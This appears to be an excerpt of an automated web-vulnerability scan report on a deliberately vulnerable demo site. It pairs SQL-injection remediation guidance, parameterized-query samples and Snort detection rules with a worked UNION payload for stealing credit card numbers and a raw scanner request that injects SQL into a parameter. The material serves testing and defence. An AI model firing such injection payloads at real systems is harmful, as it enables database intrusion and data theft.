            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50); <br />
            prm.Value = Request.QueryString["pid"]; <br />
            cmd.Parameters.Add(prm); <br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        } <br /><br />
VB.NET sample: <br /><br />

        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString) <br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)
<br />
            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50) <br />
            prm.Value = Request.QueryString("pid") <br />
            cmd.Parameters.Add(prm) <br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br /></li><li><b>Validate input: </b>The vast majority of SQL Injection checks can be prevented by properly validating user input for both type and format. The best method of doing this is via “white listing”. This is defined as only accepting specific account numbers or specific account types for those relevant fields, or only accepting integers or letters of the English alphabet for others. Many developers will try to validate input by “black listing” characters, or “escaping” them. Basically, this entails rejecting known bad data, such as a single quotation mark, by placing an “escape” character in front of it so that the item that follows will be treated as a literal value. This approach is not as effective as white listing because it is impossible to know all forms of bad data ahead of time. 


</li></ul><b>For Security Operations:</b><br />
Use the following recommendations to help prevent SQL Injection attacks upon your web applications. 

<ul><li><b>Restrict Application Privileges: </b>Limit user credentials so that only those rights the application needs to function are utilized. Any successful SQL Injection attack would run in the context of the user’s credential. While limiting privileges will not prevent SQL Injection attacks outright, it will make them significantly harder to enact.  </li><br /><li><b>Strong SA Password Policy:</b> Often, an attacker will need the functionality of the administrator account to utilize specific SQL commands. It is much easier to “brute force” the SA password when it is weak, and will increase the likelihood of a successful SQL Injection attack. Another option is not to use the SA account at all, and instead create specific accounts for specific purposes.</li><br /><li><b>Consistent Error Messaging Scheme: </b>Ensure that you provide as little information to the user as possible when a database error occurs. Don’t reveal the entire error message. Error messages need to be dealt with on both the web and application server. When a web server encounters a processing error it should respond with a generic web page, or redirect the user to a standard location. Debug information, or other details that could be useful to a potential attacker, should never be revealed. Application servers, like WebSphere, often install with error messages or debug settings enabled by default. Consult your application server’s documentation for information on suppressing those error messages. </li><br /><br /><li><b>Stored Procedures:</b> If unused, delete SQL stored procedures such as master..Xp_cmdshell, xp_startmail, xp_sendmail, and sp_makewebtask.</li></ul>

SQL Injection vulnerabilities are inherently tied to the actual code of your web application. While not a fix, you can implement an emergency measure by adding a rule that incorporates a regular expression to your IDS to check for SQL Injection attacks.  While this will not resolve all possible SQL injection vulnerabilities, it is simple to implement, and will require an attacker to escalate his methodology to achieve a successful attack. Regular expressions that can be utilized to do this follow.

<br /><br />

Regex for detection of SQL meta-characters:<br />
/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix<br /><br />

The above regular expression would be added into a Snort rule as follows:<br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection
- Paranoid";
flow:to_server,established;uricontent:".pl";pcre:"/(\%27)|(\')|(\-\-)|(%23)|
(#)/i"; classtype:Web-application-attack; sid:9099; rev:5;)<br /><br />
	
Regex for typical SQL Injection attacks:<br />
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix<br /><br />

Regex for detecting SQL Injection with the UNION keyword:<br />
/((\%27)|(\'))union/ix<br />
(\%27)|(\') <br />
the single-quote and its hex equivalent union - the keyword union<br /><br />

Similar expressions can be written for other SQL queries such as select, insert, update, delete, drop, and so on.<br /><br />

Regex for detecting SQL Injection attacks on a MS SQL Server:<br />
/exec(\s|\+)+(s|x)p\w+/ix

<br /><br /><b>






For QA: </b><br />

Fixes for SQL Injection defects will ultimately require code based fixes. The steps detailed in the Developer and Security Operations section will provide any developer with the information necessary to remediate these issues. The following steps outline how to manually test an application for SQL Injection. <br /><br /><b>

How to manually test applications for SQL Injection:</b><br />

1. Open the web application you wish to test for SQL Injection defects in a browser. <br /><br />

2. Mouse over the links of the Web site with your cursor while paying attention to the bottom status bar. You will notice the URLs that the links point to. Try to find a URL with parameters in it. Ex. http://www.site.com/articleid.asp?id=42. <br /><br />

Note: If you don't see any URL's in the status bar, then just click on links and watch the address bar until you find a URL that has parameters. <br /><br />

3. Once a URL with parameters has been found, click the link and go to that page. In the Address bar you should now see the URL that was seen in the status bar. <br /><br />

4. There are two methods for testing scripts for SQL injection. Be sure to test each parameter value one at a time with both methods. <br /><br /><b>Method 1.</b> Go to the address bar, click your cursor, and highlight a parameter value Ex. Highlight the word value in "name=value" and replace it with a single quote (').It should now look like "name=' " <br /><br /><b>Method 2. </b>Go to the address bar, click your cursor, and put a single quote (') in the middle of the value. It should now look like "name=val'ue" <br /><br />

5. Click the 'GO' button. This will send your request to the Web server. <br /><br />

6. Analyze the response from the Web server for any error messages. Most database error messages will look similar to the examples below: <br /><br /><b>Example error 1:</b><br />
Microsoft OLE DB Provider for SQL Server error '80040e14' <br />
Unclosed quotation mark before the character string '51 ORDER BY <br />
some_name'. /some_directory/some_file.asp, line 5 <br /><br /><b>Example error 2: </b><br />
ODBC Error Code = S1000 (General error) <br />
[Oracle][ODBC][Ora]ORA-00933: SQL command not properly ended <br /><br /><b>Example error 3: </b><br />
Error: 1353 SQLSTATE: HY000 (ER_VIEW_WRONG_LIST) <br />
Message: View's SELECT and view's field list have different column counts <br /><br />

7. Sometimes the error message is not obvious and is hidden in the source of the page. To look for it, you must view the HTML source of the page and search for the error. To do this in Internet Explorer, click the 'View' menu, and select the 'Source' option. This will cause notepad to open with the HTML source of the page. In notepad, click the 'Edit' menu and select 'Find'. A dialog box will appear that will ask you to 'Find What'. Type the phrase 'Microsoft OLE DB' or '[ODBC]' and click 'Find Next'. <br /><br />

8. If either step 6 or 7 is successful, then the Web site is vulnerable to SQL injection.<br />]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />

Microsoft<br /><a href="http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx">http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx</a><br /><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;302570">http://support.microsoft.com/default.aspx?scid=kb;en-us;302570</a><br /><br />

SQLSecurity.com<br /><a href="http://www.sqlsecurity.com/DesktopDefault.aspx">http://www.sqlsecurity.com/DesktopDefault.aspx</a><br /><br />

OWASP<br /><a href="http://www.owasp.org/index.php/SQL_Injection">http://www.owasp.org/index.php/SQL_Injection</a><br />]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Fundamentally, SQL injection is an attack upon the Web application, not the Web server or the OS itself. A SQL injection attack, as the name implies, is the act of adding an unexpected SQL command to a query, thereby manipulating the database in ways unintended by the database administrator or developer. SQL injection vulnerabilities are often present in Web-based forms or query strings within a URL. For example, think of a user login form. If the user input from the form is directly used to build a dynamic SQL statement, then there has been no input validation conducted, giving control to a potential attacker who may want access to the database. Basically, an attacker can use an input box to send his own request to the server, and then use the results in nefarious ways. <br /><br />
In the following URL example, the text in bold might be supplied by the client in an HTTP GET or POST parameter: <br /><br />
http://www.server.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />
In this example, the client-supplied value, 12345, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of. The Web application takes this value and inserts it into the SQL statement between the single quotes in the WHERE clause. However, consider the following URL: <br /><br />
http://www.server.com/GetItemPrice?ItemPrice?ItemNumber=<b>0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1</b><br /><br />
This would cause the Web application to produce the following SQL statement: <br /><br />
SELECT Price FROM Products WHERE ItemNumber = <b>'0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1';</b><br /><br />
In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of the user’s choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number. SQL injection can be avoided by using secure programming techniques which prevent client-supplied values from interfering with SQL statement syntax.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[The results of a successful SQL injection attack can vary greatly depending upon the environment and configuration in which it occurs. For instance, if the database connection utilizes the security context of the database owner (dbo), a successful exploitation would give an attacker the means to modify table contents, create new tables, etc. If the default account SA is utilized, successful exploitation of a SQL Injection vulnerability could lead to an attacker gaining complete control over the SQL server, or even (by creating user accounts) to taking control of the Windows server that houses the database itself.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[SQL Injection is easy to test for, often involving something as simple as submitting a single quotation mark to see if the SQL statement can be closed, and subsequently another statement added to it. Once found, SQL Injection vulnerabilities are also relatively easy to exploit.  There are a plethora of automated hacking tools that can dramatically increase the effectiveness of this attack, and information on conducting manual attacks is widespread.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed immediately.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[SQL injection is caused by programming techniques that allow client-supplied values to interfere and modify SQL statement syntax. Thus, the best solution is to design and program web applications in a manner that prevents client-supplied values from being treated as SQL syntax. The following recommendations can be used as a basis for that. 
<ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, let that field accept only numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input.</li></ul>

Strict input validation can avoid most SQL injection attacks. Be sure to reject any data that does not match the expected format. This can be done with Validation controls or directly in your code. The most important aspect of avoiding SQL injection attacks is to always parameterize your queries to the database. This prevents user-supplied data from changing the syntax of the query.<br /><br />
In the code fragment below, a product ID is obtained from the HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />
C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString))<br />
        {<br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn);<br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50);<br />
            prm.Value = Request.QueryString["pid"];<br />
            cmd.Parameters.Add(prm);<br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        }<br /><br />


VB.NET sample:<br /><br />
        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString)<br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)<br />

            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50)<br />
            prm.Value = Request.QueryString("pid")<br />
            cmd.Parameters.Add(prm)<br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br />

It is still useful and recommended to validate the contents of any input. But by using parameterized queries, even ridiculously incorrect inputs have no opportunity to alter the meaning of your SQL queries.]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText><![CDATA[<br /><b>SPI Dynamics Blind SQL Injection Whitepaper</b><br /><a href="http://www.spidynamics.com/support/whitepapers/Blind_SQLInjection.pdf">http://www.spidynamics.com/support/whitepapers/Blind_SQLInjection.pdf</a>]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />
SQL injection is caused by programming techniques that allow client-supplied values to interfere and modify SQL statement syntax. Thus, the best solution is to design and program Web applications in a manner that prevents client-supplied values from being treated as SQL syntax. The following recommendations can be used as a basis for that.
<ul><li>Stringently define the data type (a string, an alphanumeric character, etc.) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be used in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, allow that field to accept only numbers. </li><li>Define the maximum and minimum data lengths that the application will accept. </li><li>Specify acceptable numeric ranges for input. </li></ul>
Strict input validation can avoid most SQL injection attacks. Be sure to reject any data that does not match the expected format. This can be done with validation controls or directly in your code. The most important aspect of avoiding SQL injection attacks is to always use prepared statements to query the database. This prevents user-supplied data from changing the syntax of the query. Thus, prepared statements help increase security by separating SQL logic from the data being supplied. <br /><br />
In the code sample below, an OrderID is obtained from the HTTP query string, and then used in a SQL query. Note how the string containing the “SELECT” statement passed to preparedStmt is simply a static string, and is not concatenated from input. Also note how the input parameter OrderID is passed, using a setString method, to replace the place holder ‘?’ that is used within the SQL query. <br /><br />
Connection con = DriverManager.getConnection(url, "user", "pass");
int OrderID; <br /><br />
// PreparedStatement precompiles a SQL statement expecting only arguments, preventing injection of SQL keywords. <br /><br />
PreparedStatement preparedStmt = con.prepareStatement( "SELECT * FROM Orders WHERE orderid = ?" ); <br /><br />
preparedStmt.setString( 1, OrderID ); <br /><br />
ResultSet rs = preparedStmt.executeQuery();]]></SectionText></ReportSection></Issue></Issues><RawRequest id="B53573F49759607E57D851E3EBEAC49B"><![CDATA[GET /listproducts.php?cat=1%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09 HTTP/1.1
Referer: http://php.vulnweb.com/categories.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="B53573F49759607E57D851E3EBEAC49B";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="3";AttackParamDesc="cat";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="1%2509and%2509(select%2509count(*)%2509from%2509spitable)%2509%253d%25091%2509or%25091%253d0%2509";AttackStringProps="Attack";tid="43";tt="40";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="fdf9a9d4";
X-Request-Memo: ID="dd697429";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:28 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4866

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: Table 'acuart.spitable' doesn't exist
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="B53573F49759607E57D851E3EBEAC49B"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>cat=1%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>cat</Name><Value>1%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/categories.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="B53573F49759607E57D851E3EBEAC49B";PSID="1CDF5B56CF311BF69D9675E793D2E81A";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="3";AttackParamDesc="cat";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="1%2509and%2509(select%2509count(*)%2509from%2509spitable)%2509%253d%25091%2509or%25091%253d0%2509";AttackStringProps="Attack";tid="43";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="35";smi="0";sc="1";ID="fdf9a9d4";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="dd697429";sc="1";tid="43";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: Table 'acuart.spitable' doesn't exist
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:28 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4866</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="EDB58F93E06DA9DADAD1C91F71C08B63"><URL>http://php.vulnweb.com:80/hj/var/www/listproducts.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="EDB58F93E06DA9DADAD1C91F71C08B63"><![CDATA[GET /hj/var/www/listproducts.php HTTP/1.1
Referer: http://php.vulnweb.com/listproducts.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="EDB58F93E06DA9DADAD1C91F71C08B63";PSID="991928C5937B2E98B55DF77B779F5A58";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="PlainText";NodeName="%23text";Source="StaticParser";tid="53";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="c3b846ba";
X-Request-Memo: ID="8ad4b10d";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 404 Not Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:38 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 16

File not found.
]]></RawResponse><Request id="EDB58F93E06DA9DADAD1C91F71C08B63"><Method>GET</Method><Path>/hj/var/www/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
